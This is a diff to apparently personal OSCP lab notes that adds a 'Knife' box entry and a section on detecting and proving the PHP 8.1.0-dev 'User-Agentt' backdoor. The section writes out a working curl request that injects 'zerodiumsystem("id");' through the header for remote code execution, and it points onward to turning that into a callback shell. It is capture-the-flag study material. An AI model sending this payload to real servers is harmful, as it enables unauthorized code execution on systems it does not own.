@@ -171,6 +171,24 @@ curl -sS "http://$BoxIP:$WebPort/$Path" -o "$BoxDir/loot/$Filename"
 - [[OSCP/BOXES/WRITE UPS/Linux/Traverxec|Traverxec]] -- cautious content discovery and Nostromo home-directory mapping exposed the protected archive path
 - [[OSCP/BOXES/WRITE UPS/Linux/Traceback|Traceback]] -- HTML attacker clue and a clue-specific PHP-shell wordlist exposed SmEvK
 - [[OSCP/BOXES/WRITE UPS/Linux/SolidState|SolidState]] -- HTTP fingerprinting was completed, then the higher-value James and POP3 services were prioritised
+- [[OSCP/BOXES/WRITE UPS/Linux/Knife|Knife]] -- PHP 8.1.0-dev header disclosure and the `User-Agentt` identity proof routed to RCE
+
+## PHP 8.1.0-dev `User-Agentt` backdoor
+
+When the response header discloses `X-Powered-By: PHP/8.1.0-dev`, preserve the headers and prove the known development-build backdoor with a harmless identity command. The header name is `User-Agentt`, with two `t` characters.
+
+```bash
+curl -sSI "http://$BoxIP:$WebPort/" | tee "$BoxDir/loot/headers.txt"
+curl -fsS -H 'User-Agentt: zerodiumsystem("id");' \
+  "http://$BoxIP:$WebPort/" | grep -m1 'uid='
+```
+
+Do not start with a callback. The identity response proves that the header, expression, and target interpreter all align before the request is moved to [[Linux - RCE to Shell]].
+
+## Additional routing
+
+- [ ] `PHP/8.1.0-dev` is disclosed and `User-Agentt` returns `uid=` → **Go to Step 11 · [[Linux - RCE to Shell]] and catch the callback**
+- [ ] The header identifies a normal supported PHP release → **Continue ordinary content discovery and go to Step 10 · [[Linux - Exploit Search]] when no application path is found**
 
 ## Related stages
 
